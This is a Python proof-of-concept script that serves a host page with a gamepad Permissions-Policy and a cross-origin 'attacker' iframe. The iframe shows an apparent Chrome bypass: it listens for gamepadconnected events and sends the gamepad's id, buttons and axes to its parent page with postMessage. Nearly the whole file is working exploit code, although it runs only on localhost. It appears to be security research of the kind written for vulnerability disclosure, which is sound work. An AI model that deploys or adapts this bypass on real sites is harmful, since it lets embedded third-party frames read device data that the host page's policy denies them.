#!/usr/bin/env python3
"""
Gamepad PP Bypass PoC Server
- Port 8888: Host page with Permissions-Policy: gamepad=(self)
- Port 8889: Attacker iframe (cross-origin, should be denied gamepad)
"""
import http.server
import threading
import sys

class HostHandler(http.server.SimpleHTTPRequestHandler):
    """Host page — allows gamepad for self only, denies for cross-origin iframes"""
    def end_headers(self):
        # Only allow gamepad for self (top-level), deny for cross-origin iframes
        self.send_header('Permissions-Policy', 'gamepad=(self)')
        super().end_headers()

    def do_GET(self):
        if self.path == '/' or self.path == '/index.html':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            html = f'''<!DOCTYPE html>
<html>
<head><title>Gamepad PP Bypass PoC - Host</title>
<style>
body {{ font-family: monospace; padding: 20px; background: #1a1a1a; color: #0f0; }}
h1 {{ color: #0ff; }}
.info {{ color: #aaa; }}
pre {{ background: #111; padding: 10px; border: 1px solid #333; overflow: auto; }}
iframe {{ width: 100%; height: 350px; border: 2px solid #555; }}
</style>
</head>
<body>
<h1>Gamepad Permission Policy Bypass PoC</h1>
<p class="info">This page: <code>http://localhost:8888</code></p>
<p class="info">Header: <code>Permissions-Policy: gamepad=(self)</code></p>
<p class="info">Cross-origin iframe from port 8889 should NOT have gamepad access.</p>

<h2>Host (self) — gamepad should work</h2>
<div id="host-test">Testing...</div>

<h2>Cross-origin iframe (port 8889) — gamepad should be BLOCKED</h2>
<p>If the iframe reports gamepad data, the PP bypass is confirmed.</p>
<iframe src="http://localhost:8889/" allow=""></iframe>

<h2>Event Log</h2>
<pre id="log"></pre>

<script>
function log(msg) {{
  document.getElementById('log').textContent += new Date().toISOString().slice(11,19) + ' ' + msg + '\\n';
}}

// Host test
try {{
  let pads = navigator.getGamepads();
  document.getElementById('host-test').textContent = 'getGamepads() OK (self allowed)';
  log('[HOST] getGamepads() works as expected for self');
}} catch(e) {{
  document.getElementById('host-test').textContent = 'getGamepads() blocked: ' + e.message;
  log('[HOST] getGamepads() error: ' + e.message);
}}

// Also test event path on host (should work)
window.addEventListener('gamepadconnected', function(e) {{
  log('[HOST] gamepadconnected: ' + e.gamepad.id);
}});

window.addEventListener('message', function(e) {{
  log('[IFRAME] ' + e.data);
}});

log('[HOST] Page loaded. Connect a gamepad to test.');
log('[HOST] Watch for iframe messages — if it gets gamepad data, bypass confirmed!');
</script>
</body>
</html>'''
            self.wfile.write(html.encode())
        else:
            super().do_GET()

class AttackerHandler(http.server.SimpleHTTPRequestHandler):
    """Attacker iframe — cross-origin, should be denied gamepad by PP"""
    def do_GET(self):
        if self.path == '/' or self.path == '/index.html':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            html = '''<!DOCTYPE html>
<html>
<head>
<style>
body { font-family: monospace; padding: 10px; background: #222; color: #ccc; }
.bypass { color: #ff0; font-weight: bold; }
.blocked { color: #f00; }
.ok { color: #0f0; }
</style>
</head>
<body>
<h3>Cross-Origin Attacker Iframe (localhost:8889)</h3>
<div id="t1">Test 1 (getGamepads): checking...</div>
<div id="t2">Test 2 (addEventListener): waiting for gamepad...</div>
<div id="t3">Test 3 (gamepad data): waiting...</div>
<pre id="log"></pre>

<script>
function log(msg) {
  document.getElementById('log').textContent += msg + '\\n';
  try { window.parent.postMessage(msg, '*'); } catch(e) {}
}

// Test 1: getGamepads() — should be blocked by PP (renderer check)
try {
  let pads = navigator.getGamepads();
  document.getElementById('t1').innerHTML =
    '<span class="ok">Test 1: getGamepads() SUCCEEDED (' + pads.length + ' slots)</span>';
  log('TEST1-PASS: getGamepads() not blocked (PP may not apply)');
} catch(e) {
  document.getElementById('t1').innerHTML =
    '<span class="blocked">Test 1: getGamepads() BLOCKED: ' + e.message + '</span>';
  log('TEST1-BLOCKED: getGamepads() blocked by PP: ' + e.message);
}

// Test 2: addEventListener — this is the BYPASS
// DidAddEventListener -> StartUpdating -> GamepadMonitor Mojo -> NO PP CHECK
window.addEventListener('gamepadconnected', function(event) {
  let gp = event.gamepad;
  document.getElementById('t2').innerHTML =
    '<span class="bypass">Test 2: BYPASS! gamepadconnected fired despite PP!</span>';
  document.getElementById('t3').innerHTML =
    '<span class="bypass">Test 3: DATA LEAKED: ' + gp.id +
    ' (' + gp.buttons.length + ' buttons, ' + gp.axes.length + ' axes)</span>';

  log('TEST2-BYPASS: gamepadconnected event fired!');
  log('TEST3-DATA: id=' + gp.id + ' buttons=' + gp.buttons.length + ' axes=' + gp.axes.length);

  let axes = Array.from(gp.axes).map(v => v.toFixed(3));
  log('TEST3-AXES: ' + JSON.stringify(axes));
});

window.addEventListener('gamepaddisconnected', function(event) {
  log('DISCONNECT: gamepad index ' + event.gamepad.index);
});

log('Iframe loaded. Registered gamepadconnected listener.');
log('Connect a gamepad now...');
</script>
</body>
</html>'''
            self.wfile.write(html.encode())
        else:
            super().do_GET()

def run_server(handler_class, port):
    httpd = http.server.HTTPServer(("127.0.0.1", port), handler_class)
    httpd.serve_forever()

print("=== Gamepad PP Bypass PoC ===")
print(f"Host:     http://localhost:8888/")
print(f"Attacker: http://localhost:8889/ (embedded as cross-origin iframe)")
print()
print("1. Open http://localhost:8888/ in Chrome")
print("2. Connect a USB gamepad (or use Chrome DevTools > Sensors > Gamepad)")
print("3. If the iframe (port 8889) reports gamepad data, bypass confirmed!")
print()

t = threading.Thread(target=run_server, args=(AttackerHandler, 8889), daemon=True)
t.start()
run_server(HostHandler, 8888)
